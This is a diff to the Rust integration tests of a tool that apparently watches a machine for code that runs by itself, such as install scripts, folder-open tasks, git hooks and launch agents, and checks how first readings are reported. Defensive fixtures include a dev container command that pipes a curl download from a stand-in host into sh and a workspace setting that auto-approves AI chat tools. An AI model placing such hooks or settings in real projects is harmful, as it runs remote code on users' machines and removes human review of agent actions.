@@ -11,6 +11,9 @@ const TASKS_KIND: &str = "editor tasks set to run when a checkout's folder is op
 const OTHERS_KIND: &str = "other ways a checkout runs code by itself";
 const LIST_KIND: &str = "indicator list given as a file";
 const UNMATCHED_KIND: &str = "indicators against what this build does not match them with";
+const AUTOSTART_KIND: &str = "launch agents and daemons";
+/// The rule of the item that tells the places read for the first time.
+const FIRST_READ: &str = "watched.first-read";
 
 /// A task file as an editor writes it, with a task set to run when the folder is opened.
 const ON_OPEN: &str = r#"{
@@ -97,9 +100,18 @@ impl Estate {
 
     /// A run whose walk is pointed at `root` and whose agents' sessions are in `sessions`.
     fn run_with(&self, root: &Path, sessions: &Path) -> String {
+        self.go(Some(root), sessions)
+    }
+
+    /// A full run, as `immune run` makes it by default: the walk of the whole home folder.
+    fn full(&self) -> String {
+        self.go(None, &self.0.join("empty"))
+    }
+
+    fn go(&self, root: Option<&Path>, sessions: &Path) -> String {
         let empty = self.0.join("empty");
-        let out = Command::new(env!("CARGO_BIN_EXE_immune"))
-            .env("HOME", self.home())
+        let mut cmd = Command::new(env!("CARGO_BIN_EXE_immune"));
+        cmd.env("HOME", self.home())
             .env("PATH", "/usr/bin:/bin")
             .current_dir(&self.0)
             .args(["run", "--machine-name", "mac", "--store"])
@@ -110,14 +122,14 @@ impl Estate {
             .arg(self.0.join("brew.json"))
             .args(["--tailscale", "none", "--threats-input", "none"])
             .args(["--osv-crates-input", "none", "--osv-npm-input", "none"])
-            .arg("--checkouts-root")
-            .arg(root)
             .arg("--sessions-root")
             .arg(sessions)
             .arg("--servers-input")
-            .arg(&empty)
-            .output()
-            .unwrap();
+            .arg(&empty);
+        if let Some(root) = root {
+            cmd.arg("--checkouts-root").arg(root);
+        }
+        let out = cmd.output().unwrap();
         assert!(
             out.status.success(),
             "{}",
@@ -234,6 +246,65 @@ impl Estate {
         found
     }
 
+    /// The places the open items of places read for the first time name, oldest check first,
+    /// each as its id with how many things it held; empty when there is none.
+    fn told(&self) -> Vec<String> {
+        let listed = self.contract(&["findings"]);
+        let mut ids: Vec<String> = listed["findings"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .filter(|f| f["finding"]["rule"] == FIRST_READ && f["finding"]["state"] == "open")
+            .map(|f| f["finding"]["id"].as_str().unwrap().to_string())
+            .collect();
+        ids.reverse();
+        let mut out = Vec::new();
+        for id in ids {
+            let one = self.contract(&["finding", &id]);
+            out.extend(
+                one["rests_on"]
+                    .as_array()
+                    .unwrap()
+                    .iter()
+                    .filter(|j| j["entry"] == "place_first_read")
+                    .map(|j| {
+                        format!(
+                            "{} ({})",
+                            j["subject_text"].as_str().unwrap(),
+                            j["new_value_text"].as_str().unwrap()
+                        )
+                    }),
+            );
+        }
+        out
+    }
+
+    /// Leaves the store as a build from before units were recorded left it.
+    fn made_before_units(&self) {
+        Connection::open(self.store())
+            .unwrap()
+            .execute_batch("DROP TABLE unit_read; DELETE FROM meta WHERE key = 'units_since';")
+            .unwrap();
+    }
+
+    /// How many differences the journal marks as found where nobody could have known, after
+    /// the journal entry `after`.
+    fn silent_after(&self, after: i64) -> i64 {
+        self.rows(&format!(
+            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
+             WHERE text = 'first reading of its place' AND seq > {after}"
+        ))[0]
+            .parse()
+            .unwrap()
+    }
+
+    /// The last journal entry so far.
+    fn last_entry(&self) -> i64 {
+        self.rows("SELECT CAST(MAX(seq) AS TEXT) FROM journal")[0]
+            .parse()
+            .unwrap()
+    }
+
     /// The owner says he has seen every open finding.
     fn seen(&self) {
         let listed = self.contract(&["findings"]);
@@ -263,6 +334,11 @@ impl Drop for Estate {
     fn drop(&mut self) {
         let _ = std::fs::remove_dir_all(&self.0);
     }
+}
+
+fn link(target: &str, at: &Path) {
+    std::fs::create_dir_all(at.parent().unwrap()).unwrap();
+    std::os::unix::fs::symlink(target, at).unwrap();
 }
 
 fn put(path: &Path, content: &str) {
@@ -636,10 +712,11 @@ fn an_agents_file_with_comments_is_read_by_key_so_an_edit_elsewhere_is_no_findin
 }
 
 #[test]
-fn a_way_read_for_the_first_time_on_a_store_that_never_read_it_is_its_baseline() {
+fn a_way_read_for_the_first_time_on_a_store_that_never_read_it_is_told_once_and_a_script_planted_after_is_found()
+ {
     // A store of an earlier build held the checkouts and never read their package scripts:
-    // the first reading of them is the baseline, not a finding about every project. A script
-    // planted after it is found.
+    // what they hold at the first reading was there before anyone looked, so it is told once,
+    // as information, and raised by no rule. A script planted after it is found.
     let e = Estate::new("upgrade");
     let shop = e.checkout("dev/shop");
     package(&shop, "\"prepare\": \"husky\"");
@@ -654,12 +731,15 @@ fn a_way_read_for_the_first_time_on_a_store_that_never_read_it_is_its_baseline()
          DELETE FROM assertion WHERE kind LIKE '% of each checkout, the part that runs by itself'
               OR scope LIKE '%#/%';
          DELETE FROM coverage WHERE kind LIKE '% of each checkout, the part that runs by itself'
-              OR scope LIKE '%#/%';",
+              OR scope LIKE '%#/%';
+         DELETE FROM unit_read WHERE kind LIKE '% of each checkout, the part that runs by itself';",
     )
     .unwrap();
     drop(db);
     e.run();
-    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (2)"]);
+    e.seen();
     package(
         &shop,
         "\"prepare\": \"husky\", \"preinstall\": \"node x.js\"",
@@ -703,6 +783,353 @@ fn a_run_pointed_at_one_folder_speaks_only_for_its_projects_and_the_next_run_fin
             "~/dev/blog/package.json#/scripts/preinstall"
         )]
     );
+}
+
+#[test]
+fn a_first_run_pointed_at_one_folder_is_silent_there_tells_projects_elsewhere_once_and_finds_what_appears_where_it_looked()
+ {
+    // The store's first check looked into the projects of one folder: what they hold is the
+    // silent baseline. The projects elsewhere were never read; the first run that reads them
+    // tells them once and raises nothing about them. What appears where the first run did
+    // look, and a clone made after the first run that walked the whole home folder, are found.
+    let e = Estate::new("pointed-first");
+    let shop = e.checkout("dev/shop");
+    let blog = e.checkout("dev/blog");
+    let site = e.checkout("work/site");
+    // Beside the folder, not in it, though its name begins the same.
+    let tools = e.checkout("devtools/cli");
+    for c in [&shop, &blog, &site, &tools] {
+        package(c, "\"postinstall\": \"node setup.js\"");
+        agent(c, HOOK);
+    }
+    e.run_in(&e.home().join("dev"));
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    package(
+        &blog,
+        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
+    );
+    let report = e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair(
+                "autorun.package-install",
+                "~/dev/blog/package.json#/scripts/preinstall"
+            ),
+            pair(FIRST_READ, "mac"),
+        ]
+    );
+    assert_eq!(
+        e.told(),
+        [
+            "checkout:machine:mac/devtools/cli (2)",
+            "checkout:machine:mac/work/site (2)"
+        ]
+    );
+    // What the projects elsewhere hold is not counted as new either.
+    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
+    e.seen();
+    // A run pointed at a folder outside the home folder, never looked through before.
+    let outside = e.0.join("outside/tool");
+    put(&outside.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&outside, "\"preinstall\": \"node x.js\"");
+    e.run_in(&e.0.join("outside"));
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    e.seen();
+    let new = e.checkout("work/new");
+    package(&new, "\"preinstall\": \"node x.js\"");
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.package-install",
+            "~/work/new/package.json#/scripts/preinstall"
+        )]
+    );
+}
+
+#[test]
+fn a_project_file_that_could_not_be_read_on_the_first_day_is_told_once_when_it_reads_and_a_neighbour_is_still_judged()
+ {
+    // The first check could not parse one project's task file and read the other's. When the
+    // file can be read, what it holds was there all along: it is told once, never silent and
+    // never a finding by its rule. A task that appears in the project that was read is found.
+    let e = Estate::new("unparsed-then-read");
+    let shop = e.checkout("dev/shop");
+    let blog = e.checkout("dev/blog");
+    put(
+        &shop.join(".vscode/tasks.json"),
+        "{ \"tasks\": [ { \"label\": } ] }",
+    );
+    put(&blog.join(".vscode/tasks.json"), ON_ASK);
+    e.run();
+    assert!(
+        e.coverage(TASKS_KIND)
+            .starts_with("partial|could not be read: dev/shop/.vscode/tasks.json ("),
+        "{}",
+        e.coverage(TASKS_KIND)
+    );
+    put(&shop.join(".vscode/tasks.json"), ON_OPEN);
+    put(&blog.join(".vscode/tasks.json"), ON_OPEN);
+    e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair("autorun.folder-open", "~/dev/blog/.vscode/tasks.json"),
+            pair(FIRST_READ, "mac"),
+        ]
+    );
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/shop (1)"]);
+}
+
+/// Takes every permission off a folder and gives them back when dropped.
+struct Locked(PathBuf);
+
+impl Locked {
+    fn new(path: PathBuf) -> Locked {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o000)).unwrap();
+        Locked(path)
+    }
+}
+
+impl Drop for Locked {
+    fn drop(&mut self) {
+        use std::os::unix::fs::PermissionsExt;
+        let _ = std::fs::set_permissions(&self.0, std::fs::Permissions::from_mode(0o755));
+    }
+}
+
+#[test]
+fn a_watched_place_that_could_not_be_read_on_the_first_day_is_said_and_told_once_when_it_reads() {
+    // The first check could not list one folder of autostart items and says so. What that
+    // folder holds when it is first read was there all along: told once, never a finding. In
+    // the folder it did read, an item that appears later is found.
+    let e = Estate::new("unreadable-place");
+    let agents = e.home().join("Library/LaunchAgents");
+    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
+    let system = e.0.join("system/Library/LaunchAgents");
+    put(&system.join("com.invented.helper.plist"), "<plist/>\n");
+    {
+        let _locked = Locked::new(agents.clone());
+        let report = e.run();
+        assert!(
+            e.coverage(AUTOSTART_KIND)
+                .starts_with("partial|could not be read: Library/LaunchAgents ("),
+            "{}",
+            e.coverage(AUTOSTART_KIND)
+        );
+        assert!(
+            report.contains("not read in full: launch agents and daemons (partial)"),
+            "{report}"
+        );
+    }
+    put(&system.join("com.invented.other.plist"), "<plist/>\n");
+    e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair(
+                "watched.autostart",
+                "/Library/LaunchAgents/com.invented.other.plist"
+            ),
+            pair(FIRST_READ, "mac"),
+        ]
+    );
+    assert_eq!(e.told(), ["file:machine:mac/Library/LaunchAgents (1)"]);
+    assert_eq!(e.coverage(AUTOSTART_KIND), "full|");
+}
+
+#[test]
+fn a_reading_that_read_nothing_is_still_the_baseline_of_the_places_it_found_empty() {
+    // The only autostart folder that was there could not be listed, so the reading read
+    // nothing. It still looked at the folders that were not there: an item that appears in
+    // one of them is found, and counted, while what the locked folder held is told once.
+    let e = Estate::new("read-nothing");
+    let agents = e.home().join("Library/LaunchAgents");
+    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
+    {
+        let _locked = Locked::new(agents.clone());
+        e.run();
+        assert!(
+            e.coverage(AUTOSTART_KIND)
+                .starts_with("none|could not be read: Library/LaunchAgents ("),
+            "{}",
+            e.coverage(AUTOSTART_KIND)
+        );
+    }
+    let system = e.0.join("system/Library/LaunchAgents");
+    put(&system.join("com.invented.other.plist"), "<plist/>\n");
+    let report = e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair(
+                "watched.autostart",
+                "/Library/LaunchAgents/com.invented.other.plist"
+            ),
+            pair(FIRST_READ, "mac"),
+        ]
+    );
+    assert!(report.contains(", 1 new, 0 changed, 0 gone"), "{report}");
+}
+
+#[test]
+fn on_a_store_from_before_units_were_recorded_what_appeared_since_its_last_reading_is_found() {
+    // The first open by this build fills the units from what the store holds: what appeared
+    // since the older build's last reading is found, in every kind it reads, a clone made
+    // meanwhile included.
+    let e = Estate::new("from-before");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    put(&e.home().join(".zshrc"), "export A=1\n");
+    e.run();
+    e.made_before_units();
+    put(
+        &e.home()
+            .join("Library/LaunchAgents/com.invented.sync.plist"),
+        "<plist/>\n",
+    );
+    put(&e.home().join(".zlogin"), "export B=1\n");
+    put(&shop.join(".git/hooks/pre-push"), "#!/bin/sh\n");
+    package(
+        &shop,
+        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
+    );
+    let new = e.checkout("dev/new");
+    package(&new, "\"preinstall\": \"node x.js\"");
+    e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair(
+                "autorun.package-install",
+                "~/dev/new/package.json#/scripts/preinstall"
+            ),
+            pair(
+                "autorun.package-install",
+                "~/dev/shop/package.json#/scripts/preinstall"
+            ),
+            pair(
+                "watched.autostart",
+                "~/Library/LaunchAgents/com.invented.sync.plist"
+            ),
+            pair("watched.git-hook", "~/dev/shop/.git/hooks/pre-push"),
+            pair("watched.shell-profile", "~/.zlogin"),
+        ]
+    );
+}
+
+#[test]
+fn hooks_first_read_when_a_checkouts_git_file_becomes_a_folder_are_told_once_and_a_hook_added_after_is_found()
+ {
+    // While `.git` is a file the hooks are kept elsewhere and were not read. When it becomes
+    // a folder, the hooks found in it were there before anyone looked: told once. A hook added
+    // after that is found.
+    let e = Estate::new("git-file");
+    let tree = e.home().join("dev/tree");
+    put(
+        &tree.join(".git"),
+        "gitdir: /invented/.git/worktrees/tree\n",
+    );
+    e.run();
+    std::fs::remove_file(tree.join(".git")).unwrap();
+    put(&tree.join(".git/HEAD"), "ref: refs/heads/main\n");
+    put(&tree.join(".git/hooks/pre-commit"), "#!/bin/sh\n");
+    e.run();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/dev/tree (1)"]);
+    e.seen();
+    put(&tree.join(".git/hooks/post-merge"), "#!/bin/sh\n");
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair("watched.git-hook", "~/dev/tree/.git/hooks/post-merge")]
+    );
+}
+
+/// An agent's session that worked in these folders.
+fn session(e: &Estate, name: &str, cwd: &Path) {
+    put(
+        &e.0.join(format!("sessions/{name}/session.jsonl")),
+        &format!("{}\n", serde_json::json!({ "cwd": cwd })),
+    );
+}
+
+#[test]
+fn a_project_reached_only_through_agents_sessions_is_silent_at_the_first_check_and_told_once_later()
+{
+    // Agents work in folders the walk of the home folder never lists. A project their sessions
+    // lead to at the first check is the silent baseline. Sessions name folders and do not list
+    // them, so one an agent starts in later cannot be shown to be new: it is told once, and no
+    // rule raises it.
+    let e = Estate::new("agents-later");
+    let old = e.0.join("elsewhere/old");
+    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&old, "\"preinstall\": \"node x.js\"");
+    session(&e, "old", &old);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    let new = e.0.join("elsewhere/new");
+    put(&new.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&new, "\"preinstall\": \"node x.js\"");
+    session(&e, "new", &new);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    let told = e.told();
+    assert_eq!(told.len(), 1, "{told:?}");
+    assert!(told[0].ends_with("/elsewhere/new (1)"), "{told:?}");
+}
+
+#[test]
+fn a_project_in_a_folder_the_walk_skips_is_told_once_when_agents_sessions_are_first_read() {
+    // The sessions could not be read at the first check. The walk went through the home
+    // folder but not into its hidden folders, so a project there that the sessions lead to
+    // later was never looked at: what it holds is told once and kept as its baseline.
+    let e = Estate::new("agents-hidden");
+    let hidden = e.home().join(".tools/helper");
+    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&hidden, "\"preinstall\": \"node x.js\"");
+    put(&e.0.join("sessions"), "not a folder\n");
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    std::fs::remove_file(e.0.join("sessions")).unwrap();
+    session(&e, "helper", &hidden);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["checkout:machine:mac/.tools/helper (1)"]);
+    assert!(
+        !e.rows(
+            "SELECT subject FROM assertion WHERE layer = 'live'
+               AND subject LIKE '%.tools/helper/package.json#/scripts/preinstall'"
+        )
+        .is_empty()
+    );
+}
+
+#[test]
+fn a_place_a_newer_version_reads_for_the_first_time_is_told_once_and_a_change_after_is_found() {
+    // A new row in a kind of place the store has read for long: what it holds at its first
+    // reading is told once and raised by no rule, and a change in it after that is found.
+    let e = Estate::new("new-place");
+    put(&e.home().join(".zshrc"), "export A=1\n");
+    put(&e.home().join(".bash_login"), "export B=1\n");
+    e.run();
+    // As a version that did not read ~/.bash_login left the store.
+    let db = Connection::open(e.store()).unwrap();
+    db.execute_batch(
+        "DELETE FROM assertion WHERE subject LIKE '%/.bash_login' OR scope LIKE '%/.bash_login';
+         DELETE FROM coverage WHERE scope LIKE '%/.bash_login';
+         DELETE FROM unit_read WHERE unit = '.bash_login';",
+    )
+    .unwrap();
+    drop(db);
+    e.run();
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(e.told(), ["file:machine:mac/.bash_login (1)"]);
+    e.seen();
+    put(&e.home().join(".bash_login"), "export B=2\n");
+    e.run();
+    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.bash_login")]);
 }
 
 #[test]
@@ -910,9 +1337,9 @@ fn an_extensions_new_version_is_not_a_finding_and_a_new_extension_or_a_new_publi
 }
 
 #[test]
-fn a_place_in_the_home_folder_read_for_the_first_time_on_an_existing_store_is_its_baseline() {
+fn a_place_in_the_home_folder_read_for_the_first_time_on_an_existing_store_is_told_once() {
     // A store of an earlier build never read the home folder's settings: what they hold the
-    // first time is the baseline, not a finding about every server and extension.
+    // first time is told once, not a finding about every server and extension.
     let e = Estate::new("home-upgrade");
     state(&e, 1, "\"helper\": {\"command\": \"node\"}");
     put(
@@ -930,12 +1357,22 @@ fn a_place_in_the_home_folder_read_for_the_first_time_on_an_existing_store_is_it
          DELETE FROM assertion WHERE kind LIKE '~/%' OR scope LIKE '%#/%'
               OR scope LIKE '%/.vscode/extensions/%';
          DELETE FROM coverage WHERE kind LIKE '~/%' OR kind LIKE 'other places in the home folder%'
-              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%';",
+              OR scope LIKE '%#/%' OR scope LIKE '%/.vscode/extensions/%';
+         DELETE FROM unit_read WHERE kind LIKE '~/%';",
     )
     .unwrap();
     drop(db);
     e.run();
-    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
+    assert_eq!(
+        e.told(),
+        [
+            "file:machine:mac/.claude.json (1)",
+            "file:machine:mac/.gemini/settings.json (1)",
+            "file:machine:mac/.vscode/extensions (1)"
+        ]
+    );
+    e.seen();
     extension(&e, "invented.helper-0.0.1");
     e.run();
     assert_eq!(
@@ -1568,5 +2005,796 @@ fn without_a_list_nothing_of_indicators_is_read_or_written() {
     assert!(
         e.rows("SELECT 1 FROM coverage WHERE reader = 'indicators'")
             .is_empty()
+    );
+}
+
+// A change, the baseline, or read for the first time (`baseline.rs`). Each of the next tests
+// began as a probe of a review; its name says the promise.
+
+#[test]
+fn a_clone_made_after_the_first_check_whose_file_fails_at_first_is_found_and_found_again_when_it_reads()
+ {
+    // A clone's task file is a link to a file the clone does not hold; the next pull makes it
+    // a task file. The clone was made after the first check, so what it holds is new: found
+    // while it cannot be read, and again when it reads.
+    let e = Estate::new("clone-fails-first");
+    let old = e.checkout("dev/old");
+    package(&old, "\"postinstall\": \"node setup.js\"");
+    e.run();
+    let evil = e.checkout("dev/evil");
+    link("../.cache/tasks.json", &evil.join(".vscode/tasks.json"));
+    e.run();
+    assert!(
+        e.coverage(TASKS_KIND)
+            .contains("could not be read: dev/evil/.vscode/tasks.json ("),
+        "{}",
+        e.coverage(TASKS_KIND)
+    );
+    assert_eq!(
+        e.found(),
+        [pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json")]
+    );
+    e.seen();
+    std::fs::remove_file(evil.join(".vscode/tasks.json")).unwrap();
+    put(&evil.join(".vscode/tasks.json"), ON_OPEN);
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json")]
+    );
+}
+
+#[test]
+fn a_file_that_cannot_be_read_hides_nothing_added_to_another_file_of_its_project() {
+    // One project's dev container file is a link that leads nowhere, for good. A dev container
+    // file added beside it in the same project is found, and so is a second addition to it a
+    // week later.
+    let e = Estate::new("failing-neighbour");
+    let shop = e.checkout("dev/shop");
+    link(
+        "../../shared/devcontainer.json",
+        &shop.join(".devcontainer/devcontainer.json"),
+    );
+    let blog = e.checkout("dev/blog");
+    put(&blog.join(".devcontainer.json"), r#"{"name": "blog"}"#);
+    e.run();
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    put(
+        &shop.join(".devcontainer.json"),
+        r#"{"initializeCommand": "curl -s https://invented.example/x | sh"}"#,
+    );
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.editor-open",
+            "~/dev/shop/.devcontainer.json#/initializeCommand"
+        )]
+    );
+    e.seen();
+    put(
+        &shop.join(".devcontainer.json"),
+        r#"{"initializeCommand": "curl -s https://invented.example/x | sh", "postStartCommand": "sh .x"}"#,
+    );
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.editor-open",
+            "~/dev/shop/.devcontainer.json#/postStartCommand"
+        )]
+    );
+}
+
+#[test]
+fn a_new_file_beside_one_that_cannot_be_read_in_a_clone_made_after_the_first_check_is_found() {
+    // A clone keeps a workspace file that is a link to nowhere; a later pull adds another
+    // workspace file beside it. The folder was listed, and the new file was not in it.
+    let e = Estate::new("clone-dangling-workspace");
+    e.checkout("dev/old");
+    e.run();
+    let evil = e.checkout("dev/evil");
+    link(
+        "missing/team.code-workspace",
+        &evil.join("team.code-workspace"),
+    );
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.editor-open",
+            "~/dev/evil/team.code-workspace"
+        )]
+    );
+    e.seen();
+    put(
+        &evil.join("dev.code-workspace"),
+        r#"{"folders": [{"path": "."}], "settings": {"chat.tools.autoApprove": true}}"#,
+    );
+    e.run();
+    assert_eq!(
+        e.found(),
+        [
+            pair(
+                "autorun.editor-open",
+                "~/dev/evil/dev.code-workspace#/folders"
+            ),
+            pair(
+                "autorun.editor-open",
+                "~/dev/evil/dev.code-workspace#/settings/chat.tools.autoApprove"
+            ),
+        ]
+    );
+}
+
+#[test]
+fn an_extension_that_cannot_be_looked_into_hides_no_extension_installed_later() {
+    // One editor extension is a link into ~/Documents, which is never looked into. The folder of
+    // extensions was still listed: an extension installed after that is found.
+    let e = Estate::new("guarded-extension");
+    let ext = e.home().join(".vscode/extensions");
+    std::fs::create_dir_all(ext.join("ms-python.python-2024.1.0")).unwrap();
+    std::fs::create_dir_all(e.home().join("Documents/my-ext")).unwrap();
+    link(
+        e.home().join("Documents/my-ext").to_str().unwrap(),
+        &ext.join("invented.my-ext-0.0.1"),
+    );
+    e.run();
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    std::fs::create_dir_all(ext.join("invented.stealer-1.0.0")).unwrap();
+    e.run();
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.editor-extension",
+            "~/.vscode/extensions/invented.stealer"
+        )]
+    );
+}
+
+#[test]
+fn a_failure_inside_a_project_kept_in_another_hides_nothing_added_to_the_outer_project() {
+    // An agent worked in a project kept inside another, whose own package file is a link to
+    // nowhere. A script added to the outer project is found.
+    let e = Estate::new("nested-failure");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    let inner = shop.join("tools/gen");
+    put(&inner.join(".git/HEAD"), "ref: refs/heads/main\n");
+    link("../../missing/package.json", &inner.join("package.json"));
+    session(&e, "gen", &inner);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    package(
+        &shop,
+        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
+    );
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert_eq!(
+        e.found(),
+        [pair(
+            "autorun.package-install",
+            "~/dev/shop/package.json#/scripts/preinstall"
+        )]
+    );
+}
+
+#[test]
+fn a_run_pointed_at_a_folder_the_home_walk_never_enters_tells_its_projects_once_and_raises_nothing()
+{
+    // The documented way to read projects in ~/Documents is a run pointed there. Its projects
+    // were always there and were never read: no rule raises them, and one item tells which
+    // places were read for the first time and how many things each holds that run by
+    // themselves. Nothing about them is silent.
+    let e = Estate::new("pointed-documents");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    let app = e.checkout("Documents/code/app");
+    package(&app, "\"postinstall\": \"node setup.js\"");
+    agent(&app, HOOK);
+    e.run();
+    e.run();
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    e.run_in(&e.home().join("Documents"));
+    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
+    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (2)"]);
+    let one = e.contract(&["findings"]);
+    let item = &one["findings"][0];
+    assert_eq!(item["finding"]["severity"], "informational", "{item}");
+}
+
+#[test]
+fn a_project_deeper_than_the_walk_goes_is_told_once_when_a_run_reaches_it_and_raises_nothing() {
+    // The walk of the home folder lists five levels; a project at the sixth is read for the
+    // first time by a run pointed above it.
+    let e = Estate::new("deep");
+    let deep = e.checkout("src/clients/acme/apps/web/frontend");
+    package(&deep, "\"postinstall\": \"node setup.js\"");
+    e.run();
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    e.run_in(&e.home().join("src"));
+    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
+    assert_eq!(
+        e.told(),
+        ["checkout:machine:mac/src/clients/acme/apps/web/frontend (1)"]
+    );
+}
+
+#[test]
+fn a_first_agent_session_in_an_old_project_outside_the_walk_is_told_once_and_raises_nothing() {
+    // A week after the first check the owner starts an agent, for the first time, in an old
+    // project in a hidden folder the walk never lists. Sessions name folders; they cannot show
+    // that the project is new.
+    let e = Estate::new("first-session");
+    let other = e.checkout("dev/shop");
+    session(&e, "shop", &other);
+    let old = e.home().join(".config/tool");
+    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
+    package(&old, "\"preinstall\": \"node x.js\"");
+    agent(&old, HOOK);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    session(&e, "tool", &old);
+    e.run_with(&e.home(), &e.0.join("sessions"));
+    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
+    assert_eq!(e.told(), ["checkout:machine:mac/.config/tool (2)"]);
+}
+
+#[test]
+fn a_folder_that_could_not_be_listed_on_the_first_day_is_told_once_when_it_can_be_and_raises_nothing()
+ {
+    let e = Estate::new("unlisted-day-one");
+    let old = e.checkout("archive/old");
+    package(&old, "\"postinstall\": \"node setup.js\"");
+    {
+        let _l = Locked::new(e.home().join("archive"));
+        e.run();
+    }
+    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
+    e.run();
+    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
+    assert_eq!(e.told(), ["checkout:machine:mac/archive/old (1)"]);
+}
+
+#[test]
+fn on_a_store_from_before_what_was_added_since_its_last_reading_is_found_whatever_run_comes_first()
+{
+    // An older build read a project in ~/Documents only through runs pointed there. Whichever
+    // run of this build comes first, the app's run of the home folder, which does not look
+    // into it, or a run pointed there, an install script added since is found.
+    for pointed_first in [false, true] {
+        let e = Estate::new("seam");
+        let app = e.checkout("Documents/code/app");
+        package(&app, "\"postinstall\": \"node setup.js\"");
+        e.run_in(&e.home().join("Documents"));
+        e.run();
+        e.made_before_units();
+        package(
+            &app,
+            "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
+        );
+        if !pointed_first {
+            e.run();
+        }
+        e.run_in(&e.home().join("Documents"));
+        assert_eq!(
+            e.found(),
+            [pair(
+                "autorun.package-install",
+                "~/Documents/code/app/package.json#/scripts/preinstall"
+            )],
+            "pointed first: {pointed_first}"
+        );
+    }
+}
+
+/// The page of changes, as `immune view` writes it.
+fn changes_page(e: &Estate) -> String {
+    let out = Command::new(env!("CARGO_BIN_EXE_immune"))
+        .args(["view", "--no-open", "--store"])
+        .arg(e.store())
+        .output()
+        .unwrap();
+    let pages = String::from_utf8(out.stdout).unwrap();
+    let path = pages
+        .lines()
+        .find(|p| p.ends_with("changes.html"))
+        .unwrap()
+        .to_string();
+    std::fs::read_to_string(path).unwrap()
+}
+
+#[test]
+fn the_changes_page_the_status_and_the_journal_count_a_first_reading_alike() {
+    // On the first day everything found is the baseline: the page says so and counts nothing
+    // as added, as the status does. A later first reading is shown as such on the page, and
+    // the counts of the page are the status's.
+    let e = Estate::new("page-agrees");
+    let shop = e.checkout("dev/shop");
+    package(&shop, "\"postinstall\": \"node setup.js\"");
+    agent(&shop, HOOK);
+    put(&e.home().join(".zshrc"), "export A=1\n");
+    put(
+        &e.home()
+            .join("Library/LaunchAgents/com.invented.sync.plist"),
+        "<plist/>\n",
+    );
+    let app = e.checkout("Documents/code/app");
+    package(&app, "\"postinstall\": \"node setup.js\"");
+    e.run();
+    assert!(e.status()["since_previous_run"].is_null());
+    let page = changes_page(&e);
+    assert!(page.contains("+0 added, 0 changed, 0 removed, "), "{page}");
+    assert!(!page.contains("<td>added</td>"), "{page}");
+    e.run_in(&e.home().join("Documents"));
